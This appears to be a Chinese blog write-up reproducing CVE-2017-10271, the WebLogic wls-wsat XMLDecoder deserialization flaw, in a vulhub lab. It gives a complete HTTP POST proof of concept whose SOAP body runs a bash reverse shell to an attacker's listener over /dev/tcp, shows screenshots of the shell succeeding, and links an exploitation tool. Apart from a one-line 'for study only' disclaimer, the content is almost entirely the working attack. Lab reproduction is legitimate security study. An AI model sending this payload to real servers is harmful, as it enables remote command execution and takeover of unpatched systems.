# CVE-2017-10271 Weblogic 10.3.6 'wls-wsat' XMLDecoder 反序列化漏洞 - 美式加糖 - 博客园

> 原文：[`www.cnblogs.com/peace-and-romance/p/15721961.html`](https://www.cnblogs.com/peace-and-romance/p/15721961.html)

### 0X00-引言

* * *

一些道理想不通就不想了，过两年想起来的时候再想一想说不定就明白了。认知，处境不同，对待问题的态度和方法也不同，现在不理解以后或许会理解的。

### 0X01-环境搭建

* * *

靶机：CentOS Linux 7

攻击机：windows server 2016 && Kail

环境：vulhub

项目地址：[`github.com/vulhub/vulhub`](https://github.com/vulhub/vulhub)

搭建 vulhub 请访问：[空白 centos7 64 搭建 vulhub(详细)](https://www.cnblogs.com/peace-and-romance/p/15621658.html)

### 0X02-漏洞描述

* * *

Weblogic 的 WLS Security 组件对外提供 webservice 服务，其中使用了 XMLDecoder 来解析用户传入的 XML 数据，在解析的过程中出现反序列化漏洞，导致可执行任意命令。

影响版本：Weblogic 10.3.6 | 12.1.3.0.0 | 12.2.1.1.0

### 0X03-漏洞复现

* * *

##### 01-验证漏洞

`http://192.168.234.128:7001/wls-wsat/CoordinatorPortType`

![image-20211222103313786](img/4c526d1850a8c25ba4aa0fd42f138c8f.png)

可能存在漏洞，工具检测证明存在漏洞

##### 02-手动复现

POC

```
POST /wls-wsat/CoordinatorPortType HTTP/1.1
Host: IP:7001
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Content-Type: text/xml
Content-Length: 637

<soapenv:Envelope > <soapenv:Header>
<work:WorkContext >
<java version="1.4.0" class="java.beans.XMLDecoder">
<void class="java.lang.ProcessBuilder">
<array class="java.lang.String" length="3">
<void index="0">
<string>/bin/bash</string>
</void>
<void index="1">
<string>-c</string>
</void>
<void index="2">
<string>bash -i &gt;&amp; /dev/tcp/监听机 IP/PORT 0&gt;&amp;1</string>
</void>
</array>
<void method="start"/></void>
</java>
</work:WorkContext>
</soapenv:Header>
<soapenv:Body/>
</soapenv:Envelope> 
```

把原始包替换成 POC-标红为要注意的内容

![image-20211222104145238](img/5c52b3ee9a380494c9a5de2b38ab6fa5.png)

反 shell 成功

![image-20211222104241217](img/b993897ec652e84b4f2b308514f1b87e.png)

### 0X04-工具检测

* * *

工具地址：[`github.com/Liqunkit/LiqunKit_`](https://github.com/Liqunkit/LiqunKit_)

![image-20211222111613833](img/d4a348da22ec916c27924d26c553e90c.png)

![image-20211222111645379](img/ac2840d3078ab1589caf1fbd645b99a3.png)

### 0X05-免责声明

* * *

仅供学习参考

### 0X06-参考

* * *

[`paper.seebug.org/487/`](https://paper.seebug.org/487/)

[`vulhub.org/#/environments/weblogic/CVE-2017-10271/`](https://vulhub.org/#/environments/weblogic/CVE-2017-10271/)